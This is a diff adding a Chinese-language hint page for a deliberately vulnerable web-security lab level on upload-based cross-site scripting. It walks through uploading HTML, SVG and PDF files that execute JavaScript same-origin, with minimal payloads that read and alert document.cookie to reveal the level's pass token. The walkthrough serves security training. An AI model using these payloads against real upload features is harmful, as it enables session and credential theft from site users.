@@ -1,0 +1,45 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>本关是<b>上传型 XSS</b>——服务器允许上传 HTML、SVG、PDF 文件，且上传后可以在同源直接打开。思路：构造一个带 JS 的 HTML 或 SVG 文件，上传后访问返回的链接，JS 就会在同源下执行，从而读到 <code>document.cookie</code> 里的通关凭证。PDF 也可以（本关 PDF 被故意以 text/html 返回，会执行混排的脚本）。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<h4>练习目标</h4>
+<ul>
+<li>上传一个带 JS 的 <b>HTML</b> 文件，访问返回的链接后弹出 <code>alert(1)</code>。</li>
+<li>用 <b>SVG</b> 文件达到同样效果（注意：必须直接打开文件地址，作为图片引用不会执行）。</li>
+<li>用 <b>PDF</b> 文件达到同样效果，并弹出 <code>document.cookie</code>，读出通关凭证。</li>
+</ul>
+<h4>操作步骤</h4>
+<ol>
+<li>先<b>访问本关页面</b>一次：页面会写入演示 Cookie <code>xss_upload_pass</code>（里面就是通关凭证）。</li>
+<li>点页面上的"示例 payload 下载"，或按下面的代码自己造一个文件。</li>
+<li>用上传表单提交文件，页面会给出访问地址 <code>{{BASE}}/modules/xss/view.php?f=文件名</code>。</li>
+<li>在新标签页打开该地址，观察弹窗。若浏览器拦截弹窗，看地址栏右侧的"已拦截弹窗"提示。</li>
+<li>payload 换成 <code>alert(document.cookie)</code> 即可看到 <code>恭喜你完成本关挑战！</code>。</li>
+</ol>
+<h4>三种载体最小 payload</h4>
+<p><b>① HTML（upload_xss.html）</b></p>
+<pre class="src-pre">&lt;html&gt;&lt;body&gt;
+&lt;h1&gt;Upload XSS via HTML&lt;/h1&gt;
+&lt;script&gt;alert('Cookie: ' + document.cookie)&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;</pre>
+<p><b>② SVG（upload_xss.svg）</b></p>
+<pre class="src-pre">&lt;svg xmlns="http://www.w3.org/2000/svg" width="300" height="120"
+     onload="alert('Cookie: ' + document.cookie)"&gt;
+  &lt;text x="10" y="40"&gt;Upload XSS via SVG&lt;/text&gt;
+  &lt;script&gt;alert('Cookie: ' + document.cookie)&lt;/script&gt;
+&lt;/svg&gt;</pre>
+<p><b>③ PDF</b>：用站点提供的示例 PDF 最省事（自带 <code>/OpenAction</code> 与 HTML 混排尾巴）。手工构造要点如下：</p>
+<pre class="src-pre">%PDF-1.4
+1 0 obj &lt;&lt; /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R &gt;&gt; endobj
+4 0 obj &lt;&lt; /Type /Action /S /JavaScript
+  /JS (app.alert\("Upload XSS via PDF"\)) &gt;&gt; endobj
+...
+%%EOF
+&lt;script&gt;alert('Cookie: ' + document.cookie)&lt;/script&gt;</pre>
+<b>提示：</b>本关的 PDF 由 <code>view.php</code> 故意以 <code>text/html</code> 返回（模拟 MIME 配置错误），所以浏览器会执行混排的脚本；同一份文件用 Adobe Reader 打开则走 PDF 内嵌 JavaScript。<br>
+<b>注意：</b>如果文件被覆盖或想换 payload，直接在"已上传文件"里点"删除"后重传。
+</div>
+</details>
